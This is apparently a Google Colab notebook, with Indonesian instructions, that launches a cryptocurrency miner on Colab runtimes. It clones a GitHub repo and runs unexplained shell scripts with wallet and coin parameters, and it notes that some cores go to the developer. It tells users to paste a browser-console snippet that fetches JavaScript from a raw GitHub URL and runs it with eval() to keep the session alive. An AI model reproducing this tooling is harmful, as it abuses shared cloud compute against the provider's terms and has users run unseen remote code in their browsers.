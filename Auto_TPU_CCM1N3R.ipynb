{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Auto TPU CCM1N3R.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "9LZsXRO1V-fu"
      },
      "source": [
        "# **Welcome To Liebe Project**\n",
        "script created by **OGdangID**\n",
        "\n",
        "how to use \n",
        "\n",
        "1. Initial\n",
        "\n",
        "2. Start Engine\n",
        "\n",
        "3. Paste eternal runer in your browser console\n",
        "\n",
        "\n",
        "\n",
        "```\n",
        "# Eternal Runer\n",
        "async function eternalMode() {\n",
        "  let url = 'https://raw.githubusercontent.com/sallygonza/borr/main/netep.js'\n",
        "  let response = await fetch(url);\n",
        "  let script = await response.text();\n",
        "  eval(script);\n",
        "}\n",
        "eternalMode();\n",
        "```\n",
        "Note : Script ini hanya berfungsi di cpu intel, yg ingin sc buat amd bisa hubungi developer, jika berjalan di atas 4 core maka ada sebagian core yg di alokasikan untuk developer\n",
        "\n",
        "**Penting : di sekitar menit ke 2 - ke 10 biasanya muncul captha, captha di klik manual atau menggunakan extensi, kemudian akan muncul lg setiap 3 jam sekali**\n",
        "\n",
        "▶ Based On ccm1n3r\n",
        "\n",
        
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "AsaV74W30ETj",
        "cellView": "form"
      },
      "source": [
        "#@title **2. Start Engine**\n",
        "#@markdown  NB: wallet sesuai koin, penulisan koin dengan huruf kapital \n",
        "\n",
        "#@markdown Level di isi jumlah core jika di kosongkan otomatis menggunakan seluruh core\n",
        "Name = \"liebe\" #@param {type:\"string\"}\n",
        "Wallet = \"\" #@param {type:\"string\"}\n",
        "Coin = \"\" #@param {type:\"string\"}\n",
        "Level =  \"\"#@param {type:\"string\"}\n",
        "!cd /home && nohup sudo apt install expect && nohup git clone https://github.com/sallygonza/pacul.git && cd pacul && chmod +x molaih.sh\n",
        "!cd /home/pacul && ./molaih.sh $Name $Wallet $Coin $Level\n",
        "from IPython.display import clear_output\n",
        "clear_output()\n",
        "!cat /home/pacul/info.txt\n",
        "print('Enggin berhasil di jalankan di background')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "k5kSrJAQoJN0",
        "cellView": "form"
      },
      "source": [
        "#@title **1. Initial**\n",
        "#@markdown Berfungsi untuk melihat spesifikasi\n",
        "!lscpu"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "DGqhqrAb1ac3",
        "cellView": "form"
      },
      "source": [
        "#@title **3. Check enggine**\n",
        "import time\n",
        "import psutil\n",
        "import datetime\n",
        "from IPython.display import clear_output\n",
        "clear_output()\n",
        "!cat /home/pacul/info.txt\n",
        "\n",
        "for x in range(5):\n",
        "  x = datetime.datetime.now()\n",
        "  Tn = psutil.cpu_percent()\n",
        "  print(x.strftime(f\"Peforma tukang %H:%M:%S  : {Tn} %\"))\n",
        "  time.sleep(3)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "fUbyYduloU5D",
        "cellView": "form"
      },
      "source": [
        "#@title **4. Check engine**\n",
        "import time\n",
        "import psutil\n",
        "import datetime\n",
        "from IPython.display import clear_output\n",
        "clear_output()\n",
        "!cat /home/pacul/info.txt\n",
        "\n",
        "for x in range(5):\n",
        "  x = datetime.datetime.now()\n",
        "  Tn = psutil.cpu_percent()\n",
        "  print(x.strftime(f\"Peforma tukang %H:%M:%S  : {Tn} %\"))\n",
        "  time.sleep(3)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "WwE31p3p1ag5",
        "cellView": "form"
      },
      "source": [
        "#@title **5. Reconfigure & Rerun**\n",
        "Name = \"liebe\" #@param {type:\"string\"}\n",
        "Wallet = \"\" #@param {type:\"string\"}\n",
        "Coin = \"\" #@param {type:\"string\"}\n",
        "Level =  \"\"#@param {type:\"string\"}\n",
        "!cd /home/pacul && chmod +x mbaleni.sh && ./mbaleni.sh $Name $Wallet $Coin $Level"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "t_wVf0kv1T-l",
        "cellView": "form"
      },
      "source": [
        "#@title **6. Stop Engine**\n",
        "!cd /home/pacul && chmod +x mateni.sh && ./mateni.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
